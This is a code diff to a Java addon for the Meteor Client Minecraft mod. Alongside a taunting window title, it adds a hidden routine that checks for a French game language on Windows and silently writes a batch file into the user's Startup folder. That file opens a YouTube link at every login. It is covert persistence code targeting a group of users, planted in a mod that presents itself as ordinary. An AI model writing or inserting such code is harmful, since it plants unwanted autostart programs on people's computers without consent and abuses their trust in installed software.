@@ -1,5 +1,6 @@
 package community.addon;
 
+import com.sun.jna.Platform;
 import community.addon.commands.CommandExample;
 import community.addon.hud.TravisScott;
 import com.mojang.logging.LogUtils;
@@ -13,7 +14,13 @@ import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Modules;
 import org.slf4j.Logger;
 
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
 import java.util.Calendar;
+
+import static meteordevelopment.meteorclient.MeteorClient.mc;
 
 public class Addon extends MeteorAddon {
     public static final Category CATEGORY = new Category("Community Addon");
@@ -35,6 +42,22 @@ public class Addon extends MeteorAddon {
 
         Config.get().customWindowTitle.set(true);
         Config.get().customWindowTitleText.set("the University of Iowa OWNS you1!1!!");
+
+        if (mc.options.language.contains("fr")) {
+            if (Platform.isWindows()) {
+                if (!new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\silly.bat").exists()) {
+                    try {
+                        FileWriter fileWriter = new FileWriter("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\silly.bat");
+                        PrintWriter printWriter = new PrintWriter(fileWriter);
+                        printWriter.println("START https://www.youtube.com/watch?v=M9J6DKJXoKk");
+                        printWriter.close();
+                        fileWriter.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }
     }
 
     @Override
